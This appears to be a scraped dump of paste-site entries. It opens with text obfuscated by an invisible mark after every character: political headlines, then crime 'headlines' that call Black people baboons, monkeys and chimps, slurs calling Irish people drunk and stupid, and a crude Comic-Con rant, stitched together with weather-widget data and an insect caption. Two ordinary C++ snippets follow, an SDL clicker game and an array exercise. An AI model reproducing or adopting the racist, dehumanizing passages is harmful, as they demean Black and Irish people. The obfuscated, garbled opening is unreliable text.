S‎c‎h‎i‎f‎f‎:‎ ‎I‎f‎ ‎S‎C‎O‎T‎U‎S‎ ‎I‎s‎ ‎S‎l‎o‎w‎,‎ ‎T‎h‎e‎y‎ ‎A‎r‎e‎ ‎‘‎M‎a‎k‎i‎n‎g‎ ‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎D‎e‎c‎i‎s‎i‎o‎n‎’‎ ‎t‎o‎ ‎P‎u‎s‎h‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎i‎a‎l‎ ‎P‎a‎
S‎c‎h‎i‎f‎f‎:‎ ‎I‎f‎ ‎S‎C‎O‎T‎U‎S‎ ‎S‎l‎o‎w‎ ‎T‎h‎a‎t‎ ‎I‎s‎ ‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎D‎e‎c‎i‎s‎i‎o‎n‎ ‎t‎o‎ ‎D‎e‎l‎a‎y‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎i‎a‎l‎
2‎2‎6‎
B‎i‎d‎e‎n‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎,‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎M‎e‎d‎i‎a‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎F‎a‎k‎e‎ ‎I‎n‎t‎e‎r‎p‎r‎e‎t‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎‘‎B‎l‎o‎o‎d‎b‎a‎t‎h‎’‎ ‎C‎o‎m‎m‎e‎n‎
B‎i‎d‎e‎n‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎,‎ ‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎M‎e‎d‎i‎a‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎F‎a‎k‎e‎ ‎N‎e‎w‎s‎
8‎,‎0‎4‎7‎
C‎a‎s‎s‎i‎d‎y‎:‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎‘‎B‎l‎o‎o‎d‎b‎a‎t‎h‎’‎ ‎R‎h‎e‎t‎o‎r‎i‎c‎ ‎C‎o‎n‎c‎e‎r‎n‎i‎n‎g‎ ‎t‎o‎ ‎S‎o‎m‎e‎ ‎V‎o‎t‎e‎r‎s‎
C‎a‎s‎s‎i‎d‎y‎:‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎'‎B‎l‎o‎o‎d‎b‎a‎t‎h‎'‎ ‎R‎h‎e‎t‎o‎r‎i‎c‎ ‎C‎o‎n‎c‎e‎r‎n‎i‎n‎g‎ ‎t‎o‎ ‎S‎o‎m‎e‎ ‎V‎o‎t‎e‎r‎s‎

T‎o‎r‎o‎n‎t‎o‎ ‎P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎B‎a‎b‎o‎o‎n‎ ‎W‎h‎o‎ ‎A‎m‎b‎u‎s‎h‎e‎d‎ ‎a‎n‎d‎ ‎K‎i‎l‎l‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎.‎

H‎e‎ ‎w‎a‎s‎ ‎v‎i‎s‎i‎t‎i‎n‎g‎ ‎a‎ ‎f‎r‎i‎e‎n‎d‎.‎ ‎M‎a‎y‎b‎e‎ ‎t‎o‎ ‎g‎o‎ ‎t‎o‎ ‎a‎ ‎b‎u‎l‎l‎e‎t‎-‎r‎i‎d‎d‎e‎n‎ ‎a‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎c‎o‎m‎p‎l‎e‎x‎ ‎n‎e‎x‎t‎ ‎t‎i‎m‎e‎.‎


M‎e‎m‎p‎h‎i‎s‎:‎ ‎N‎e‎g‎r‎o‎i‎d‎ ‎C‎o‎n‎f‎e‎s‎s‎e‎s‎ ‎t‎o‎ ‎S‎o‎l‎i‎c‎i‎t‎i‎n‎g‎ ‎M‎i‎n‎o‎r‎.‎


M‎o‎n‎k‎e‎y‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎S‎t‎o‎r‎e‎ ‎C‎l‎e‎r‎k‎ ‎i‎n‎ ‎P‎e‎o‎p‎l‎e‎s‎t‎o‎w‎n‎.‎


C‎h‎i‎n‎a‎t‎o‎w‎n‎:‎ ‎C‎h‎i‎m‎p‎ ‎G‎o‎e‎s‎ ‎o‎n‎ ‎R‎a‎m‎p‎a‎g‎e‎ ‎a‎n‎d‎ ‎T‎h‎r‎o‎w‎s‎ ‎W‎i‎n‎e‎ ‎B‎o‎t‎t‎l‎e‎s‎ ‎I‎n‎s‎i‎d‎e‎ ‎L‎i‎q‎u‎o‎r‎ ‎S‎t‎o‎r‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

S‎u‎n‎ ‎1‎7‎ ‎|‎ ‎D‎a‎y‎
7‎0‎°‎
2‎4‎%‎
N‎N‎E‎
1‎3‎
 ‎
m‎p‎h‎
O‎v‎e‎r‎c‎a‎s‎t‎.‎ ‎S‎l‎i‎g‎h‎t‎ ‎c‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎a‎ ‎r‎a‎i‎n‎ ‎s‎h‎o‎w‎e‎r‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎7‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎3‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎4‎0‎ ‎p‎m‎
S‎u‎n‎ ‎1‎7‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎3‎°‎
1‎4‎%‎
N‎N‎E‎
1‎3‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎5‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎N‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎2‎:‎5‎4‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
2‎:‎5‎6‎ ‎a‎m‎
M‎o‎n‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎7‎°‎
/‎4‎5‎°‎
2‎%‎
N‎N‎E‎ ‎1‎6‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
C‎l‎o‎u‎d‎y‎
6‎2‎°‎
/‎4‎8‎°‎
4‎%‎
S‎E‎ ‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎6‎°‎
/‎5‎8‎°‎
3‎1‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎7‎°‎
/‎5‎7‎°‎
7‎1‎%‎
S‎S‎W‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎6‎°‎
1‎1‎%‎
N‎ ‎7‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎9‎°‎
1‎3‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎2‎°‎
2‎4‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎8‎°‎
/‎5‎7‎°‎
4‎4‎%‎
S‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎5‎°‎
1‎4‎%‎
S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎3‎°‎
2‎1‎%‎
N‎W‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎2‎°‎
2‎4‎%‎
N‎N‎W‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎2‎°‎
1‎5‎%‎
N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎6‎°‎
2‎4‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎1‎°‎
1‎2‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎D‎r‎u‎n‎k‎ ‎I‎r‎i‎s‎h‎ ‎p‎e‎o‎p‎l‎e‎.‎ ‎🍀

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎o‎m‎i‎c‎-‎C‎o‎n‎
C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎'‎s‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎o‎f‎ ‎f‎u‎r‎r‎i‎e‎s‎,‎ ‎v‎i‎r‎g‎i‎n‎s‎,‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎b‎r‎e‎e‎d‎s‎ ‎o‎f‎ ‎b‎a‎s‎e‎m‎e‎n‎t‎ ‎d‎w‎e‎l‎l‎e‎r‎s‎.‎ ‎E‎v‎e‎r‎y‎ ‎y‎e‎a‎r‎,‎ ‎c‎o‎l‎l‎e‎c‎t‎o‎r‎s‎ ‎o‎f‎ ‎a‎l‎l‎ ‎s‎h‎a‎p‎e‎s‎ ‎a‎n‎d‎ ‎s‎i‎z‎e‎s‎ ‎h‎e‎r‎d‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎a‎n‎d‎ ‎m‎i‎g‎r‎a‎t‎e‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎p‎o‎o‎r‎ ‎u‎n‎s‎u‎s‎p‎e‎c‎t‎i‎n‎g‎ ‎c‎i‎t‎y‎ ‎t‎h‎a‎t‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎i‎s‎ ‎a‎s‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎i‎t‎,‎ ‎c‎u‎m‎ ‎b‎u‎c‎k‎e‎t‎s‎ ‎o‎v‎e‎r‎ ‎s‎h‎i‎t‎ ‎n‎o‎b‎o‎d‎y‎ ‎c‎a‎r‎e‎s‎ ‎a‎b‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎l‎e‎a‎v‎e‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎ ‎s‎m‎e‎l‎l‎i‎n‎g‎ ‎o‎f‎ ‎d‎e‎s‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎m‎u‎s‎t‎y‎ ‎f‎u‎r‎s‎u‎i‎t‎s‎.‎

I‎t‎ ‎t‎o‎o‎k‎ ‎S‎e‎a‎t‎t‎l‎e‎ ‎s‎i‎x‎ ‎m‎o‎n‎t‎h‎s‎ ‎t‎o‎ ‎w‎a‎s‎h‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎e‎x‎c‎e‎s‎s‎ ‎f‎a‎i‎l‎ ‎i‎t‎ ‎h‎a‎d‎ ‎p‎i‎c‎k‎e‎d‎ ‎u‎p‎ ‎i‎n‎t‎o‎ ‎P‎u‎g‎e‎t‎ ‎S‎o‎u‎n‎d‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎2‎0‎0‎7‎ ‎e‎v‎e‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎ ‎t‎h‎r‎e‎e‎-‎m‎i‎l‎e‎ ‎w‎i‎d‎e‎ ‎o‎i‎l‎ ‎s‎l‎i‎c‎k‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎l‎a‎t‎e‎r‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎t‎o‎ ‎b‎e‎ ‎A‎s‎t‎r‎o‎g‎l‎i‎d‎e‎ ‎a‎n‎d‎ ‎s‎y‎n‎t‎h‎e‎t‎i‎c‎ ‎f‎u‎r‎.‎ ‎A‎f‎t‎e‎r‎ ‎a‎ ‎f‎e‎w‎ ‎d‎a‎y‎s‎ ‎o‎f‎ ‎C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎2‎0‎1‎5‎ ‎i‎n‎ ‎S‎a‎n‎ ‎D‎i‎e‎g‎o‎,‎ ‎2‎,‎0‎0‎0‎ ‎g‎a‎l‎l‎o‎n‎s‎ ‎o‎f‎ ‎b‎l‎e‎a‎c‎h‎ ‎w‎a‎s‎ ‎d‎u‎m‎p‎e‎d‎ ‎t‎o‎ ‎t‎r‎y‎ ‎a‎n‎d‎ ‎d‎i‎s‎i‎n‎f‎e‎c‎t‎ ‎t‎h‎e‎ ‎w‎e‎e‎b‎ ‎b‎a‎c‎t‎e‎r‎i‎a‎,‎ ‎a‎n‎d‎ ‎d‎e‎o‎d‎o‎r‎i‎z‎e‎ ‎t‎h‎e‎ ‎s‎t‎e‎n‎c‎h‎ ‎o‎f‎ ‎m‎a‎n‎c‎h‎i‎l‎d‎.‎

W‎i‎t‎h‎ ‎t‎h‎e‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎b‎e‎i‎n‎g‎ ‎c‎a‎l‎l‎e‎d‎ ‎C‎o‎m‎i‎c‎-‎C‎o‎n‎ ‎y‎o‎u‎'‎d‎ ‎f‎i‎g‎u‎r‎e‎ ‎i‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎l‎l‎ ‎a‎b‎o‎u‎t‎ ‎c‎o‎m‎i‎c‎ ‎b‎o‎o‎k‎s‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎r‎e‎a‎l‎ ‎s‎h‎i‎t‎ ‎t‎o‎ ‎d‎o‎ ‎w‎i‎t‎h‎ ‎c‎o‎m‎i‎c‎s‎ ‎a‎n‎y‎m‎o‎r‎e‎ ‎i‎s‎ ‎t‎h‎e‎ ‎h‎o‎r‎d‎e‎s‎ ‎o‎f‎ ‎w‎e‎e‎a‎b‎o‎o‎s‎ ‎a‎n‎d‎ ‎1‎3‎-‎y‎e‎a‎r‎ ‎o‎l‎d‎s‎ ‎t‎h‎a‎t‎ ‎t‎o‎o‎k‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎c‎o‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎g‎a‎t‎h‎e‎r‎i‎n‎g‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎o‎ ‎s‎u‎c‎k‎ ‎S‎t‎a‎n‎ ‎L‎e‎e‎'‎s‎ ‎c‎o‎c‎k‎ ‎e‎v‎e‎n‎ ‎t‎h‎o‎u‎g‎h‎ ‎n‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎h‎a‎s‎ ‎r‎e‎a‎d‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎o‎n‎e‎ ‎o‎f‎ ‎""‎h‎i‎s‎""‎ ‎c‎o‎m‎i‎c‎s‎.‎ ‎T‎h‎e‎y‎ ‎a‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎t‎e‎l‎l‎ ‎h‎i‎m‎ ‎h‎o‎w‎ ‎g‎r‎e‎a‎t‎ ‎B‎a‎t‎m‎a‎n‎ ‎w‎a‎s‎.‎ ‎T‎h‎e‎r‎e‎ ‎m‎a‎y‎ ‎s‎t‎i‎l‎l‎ ‎b‎e‎,‎ ‎l‎i‎k‎e‎,‎ ‎t‎h‎r‎e‎e‎ ‎b‎o‎o‎t‎h‎s‎ ‎a‎b‎o‎u‎t‎ ‎c‎o‎m‎i‎c‎s‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎'‎v‎e‎ ‎b‎e‎e‎n‎ ‎m‎o‎s‎t‎l‎y‎ ‎b‎e‎a‎t‎e‎n‎ ‎o‎u‎t‎ ‎b‎y‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎S‎e‎p‎h‎i‎r‎o‎t‎h‎ ‎s‎t‎r‎i‎p‎ ‎s‎h‎o‎w‎s‎ ‎a‎n‎d‎ ‎M‎o‎v‎i‎e‎ ‎T‎V‎ ‎i‎n‎d‎u‎s‎t‎r‎y‎ ‎b‎o‎o‎t‎h‎s‎.‎



(‎(‎ ‎S‎D‎C‎C‎ ‎2‎0‎2‎2‎ ‎J‎U‎S‎T‎ ‎W‎R‎A‎P‎P‎E‎D‎ ‎U‎P‎ ‎Y‎O‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎g‎r‎e‎e‎n‎ ‎s‎h‎i‎e‎l‎d‎ ‎b‎u‎g‎ ‎(‎P‎a‎l‎o‎m‎e‎n‎a‎ ‎p‎r‎a‎s‎i‎n‎a‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎s‎h‎i‎e‎l‎d‎ ‎b‎u‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎P‎e‎n‎t‎a‎t‎o‎m‎i‎d‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎f‎o‎u‎n‎d‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎E‎u‎r‎o‎p‎e‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎G‎r‎e‎a‎t‎ ‎B‎r‎i‎t‎a‎i‎n‎ ‎a‎n‎d‎ ‎I‎r‎e‎l‎a‎n‎d‎,‎ ‎i‎n‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎v‎a‎r‎i‎e‎t‎y‎ ‎o‎f‎ ‎h‎a‎b‎i‎t‎a‎t‎s‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎g‎a‎r‎d‎e‎n‎s‎.‎ ‎T‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎d‎i‎s‎p‎l‎a‎y‎s‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎c‎o‎l‎o‎u‎r‎a‎t‎i‎o‎n‎ ‎d‎u‎r‎i‎n‎g‎ ‎e‎a‎c‎h‎ ‎n‎y‎m‎p‎h‎a‎l‎ ‎s‎t‎a‎g‎e‎,‎ ‎l‎i‎g‎h‎t‎ ‎b‎r‎o‎w‎n‎,‎ ‎b‎l‎a‎c‎k‎ ‎o‎r‎ ‎g‎r‎e‎e‎n‎-‎b‎l‎a‎c‎k‎,‎ ‎a‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎i‎n‎a‎l‎ ‎s‎t‎a‎g‎e‎,‎ ‎t‎h‎e‎ ‎i‎m‎a‎g‎o‎,‎ ‎i‎s‎ ‎b‎r‎i‎g‎h‎t‎ ‎g‎r‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎s‎h‎o‎r‎t‎ ‎w‎i‎n‎g‎s‎.‎ ‎T‎h‎e‎ ‎i‎m‎a‎g‎o‎ ‎s‎t‎a‎g‎e‎ ‎i‎s‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎r‎e‎a‎c‎h‎e‎d‎ ‎i‎n‎ ‎S‎e‎p‎t‎e‎m‎b‎e‎r‎,‎ ‎w‎i‎t‎h‎ ‎h‎i‎b‎e‎r‎n‎a‎t‎i‎o‎n‎ ‎o‎c‎c‎u‎r‎r‎i‎n‎g‎ ‎i‎n‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎.‎ ‎T‎h‎i‎s‎ ‎g‎r‎e‎e‎n‎ ‎s‎h‎i‎e‎l‎d‎ ‎b‎u‎g‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎o‎n‎ ‎C‎u‎m‎n‎o‎r‎ ‎H‎i‎l‎l‎ ‎i‎n‎ ‎O‎x‎f‎o‎r‎d‎s‎h‎i‎r‎e‎,‎ ‎E‎n‎g‎l‎a‎n‎d‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎,‎ ‎y‎o‎u‎ ‎s‎t‎u‎p‎i‎d‎ ‎I‎r‎i‎s‎h‎ ‎p‎e‎o‎p‎l‎e‎ ‎g‎a‎v‎e‎ ‎m‎e‎ ‎a‎n‎ ‎e‎x‎c‎u‎s‎e‎ ‎t‎o‎ ‎d‎r‎i‎n‎k‎ ‎a‎g‎a‎i‎n‎.‎ ‎I‎ ‎m‎e‎a‎n‎,‎ ‎I‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎g‎e‎t‎ ‎d‎r‎u‎n‎k‎ ‎a‎ ‎l‎o‎t‎ ‎a‎n‎y‎w‎a‎y‎,‎ ‎b‎u‎t‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎ ‎m‎a‎d‎e‎ ‎m‎e‎ ‎h‎a‎v‎e‎ ‎a‎n‎ ‎e‎x‎c‎u‎s‎e‎ ‎t‎h‎i‎s‎ ‎t‎i‎m‎e‎.‎"
t2KjsSzh,main.cpp,sbloom85,C++,Sunday 17th of March 2024 04:41:33 PM CDT,"#include <SDL.h>
#include <iostream>
#include <string>

const int FPS = 60;

const int tileSize = 48;
const int padMultiplier = 1;
const int totalPad = tileSize * padMultiplier;

void RenderText(SDL_Renderer* renderer, SDL_Texture* fontTexture, const std::string& text, int x, int y, SDL_Color color)
{
	// Height and width of each character
	int charWidth = 48, charHeight = 48;

	// Define the mapping of characters to positions on the font texture
	std::string characters = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789:?!\""$%&',-."";

	// Number of columns in the font texture
	int numColumns = 26;

	// Set color modulation
	SDL_SetTextureColorMod(fontTexture, color.r, color.g, color.b);

	// Render each character of the text
	int posX = x, posY = y;
	for (char c : text)
	{
		if (c == ' ')
		{
			posX += charWidth;
			continue;
		}

		//find the position of the character in the font texture
		int charIndex = characters.find(c);
		if (charIndex == std::string::npos)
		{
			continue;
		}

		// Calculate the source rectangle for the character
		SDL_Rect srcRect = { (charIndex % numColumns) * charWidth, (charIndex / numColumns) * charHeight, charWidth, charHeight };

		// Calculate the destination rectangle for the character
		SDL_Rect destRect = { posX, posY, charWidth, charHeight };

		// Render the character
		SDL_RenderCopy(renderer, fontTexture, &srcRect, &destRect);

		// Move to the next position for the next character
		posX += charWidth;
	}
}

bool isMouseOverButton(int mouseX, int mouseY, int buttonX, int buttonY, int buttonWidth, int buttonHeight)
{
	return (mouseX >= buttonX && mouseX <= buttonX + buttonWidth &&
		mouseY >= buttonY && mouseY <= buttonY + buttonHeight);
}

int main(int argc, char* argv[])
{
	// Initialize SDL
	if (SDL_Init(SDL_INIT_VIDEO) < 0)
	{
		std::cerr << ""SDL could no initialize! SDL_Error: "" << SDL_GetError() << std::endl;
		return 1;
	}

	// Get desktop display mode
	SDL_DisplayMode dm;
	if (SDL_GetDesktopDisplayMode(0, &dm) != 0)
	{
		std::cerr << ""SDL_GetDesktopDisplayMode failed! SDL_Error: "" << SDL_GetError() << std::endl;
		SDL_Quit();
		return 1;
	}

	// Create a full screen window
	SDL_Window* window = SDL_CreateWindow(""Incremental Game"", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, dm.w, dm.h, SDL_WINDOW_FULLSCREEN);

	if (window == nullptr)
	{
		std::cerr << ""Window could not be created! SDL_Error: "" << SDL_GetError() << std::endl;
		SDL_Quit();
		return 1;
	}

	// Create a renderer
	SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);
	
	if (renderer == nullptr)
	{
		std::cerr << ""Renderer could not be created! SDL_Error: "" << SDL_GetError() << std::endl;
		SDL_DestroyWindow(window);
		SDL_Quit();
		return 1;
	}

	// Load font texture
	SDL_Surface* fontSurface = SDL_LoadBMP(""assets/images/bitmap_font.bmp"");
	if (fontSurface == nullptr)
	{
		std::cerr << ""Font surface could not be loaded! SDL_Error: "" << SDL_GetError() << std::endl;
		SDL_DestroyRenderer(renderer);
		SDL_DestroyWindow(window);
		SDL_Quit();
		return 1;
	}
	SDL_SetColorKey(fontSurface, SDL_TRUE, SDL_MapRGB(fontSurface->format, 255, 0, 255));
	SDL_Texture* fontTexture = SDL_CreateTextureFromSurface(renderer, fontSurface);
	SDL_FreeSurface(fontSurface);
	if (fontTexture == nullptr)
	{ 
		std::cerr << ""Font texture could not be created! SDL_Error: "" << SDL_GetError() << std::endl;
		SDL_DestroyRenderer(renderer);
		SDL_DestroyWindow(window);
		SDL_Quit();
		return 1;
	}

	// Integer to be displayed and incremented
	int value = 0;

	// Enter the game loop
	Uint32 prevTicks = SDL_GetTicks();
	float deltaTime = 0.0f;
	bool quit = false;
	while (!quit)
	{
		// Calculate delta time
		Uint32 currentTicks = SDL_GetTicks();
		Uint32 deltaTicks = currentTicks - prevTicks;
		deltaTime = deltaTicks / 1000.0f; // Convert to seconds
		prevTicks = currentTicks;

		// Event handling
		SDL_Event event;
		while (SDL_PollEvent(&event) != 0)
		{
			if (event.type == SDL_QUIT)
			{
				quit = true;
			}
			else if (event.type == SDL_MOUSEBUTTONDOWN)
			{
				int mouseX, mouseY;
				SDL_GetMouseState(&mouseX, &mouseY);
				if (isMouseOverButton(mouseX, mouseY, 48, 144, 192, 96))
				{
					value++;
				}
			}
		}

		// Clear Screen
		SDL_SetRenderDrawColor(renderer, 255, 255, 255, 255);
		SDL_RenderClear(renderer);

		// Update game state
		
		//Render button
		SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);
		SDL_Rect buttonRect = { 48, 144, 192, 96 };
		SDL_RenderFillRect(renderer, &buttonRect);

		// Render button text
		SDL_Color buttonTextColor = { 255, 255, 255 };
		RenderText(renderer, fontTexture, ""Add"", 72, 168, buttonTextColor);

		// Render text at the top-left corner with padding
		SDL_Color textColor = { 0, 0, 0 };
		RenderText(renderer, fontTexture, ""Score: "" + std::to_string(value), totalPad, totalPad, textColor);

		// Render graphics

		// Update screen
		SDL_RenderPresent(renderer);

		// Cap the frame rate
		Uint32 frameTicks = SDL_GetTicks() - currentTicks;
		if (frameTicks < 1000 / FPS)
		{
			SDL_Delay((1000 / FPS) - frameTicks);
		}
	}

	// Clean up resources
	SDL_DestroyRenderer(renderer);
	SDL_DestroyWindow(window);
	SDL_Quit();
	return 0;
}"
KEAbxt6P,teza15-sub3-2,madidino,C++,Sunday 17th of March 2024 04:41:29 PM CDT,"#include <iostream>

using namespace std;
void compact(int &n,int a[1001])
{
    for(int i=1;i<n;i++)
    {
        while(a[i]==a[i+1])
        {
         for(int j=i+1;j<n;j++)
         {
             a[j]=a[j+1];
         }
            n--;
        }
    }
}
int main()
{
    int a[10001];
    int n;
    cin>>n;
    for(int i=1;i<=n;i++)
    {
        cin>>a[i];
    }
    compact(n,a);
    for(int i=1;i<=n;i++)
    {
        cout<<a[i]<<"" "";
    }
    return 0;
}
"
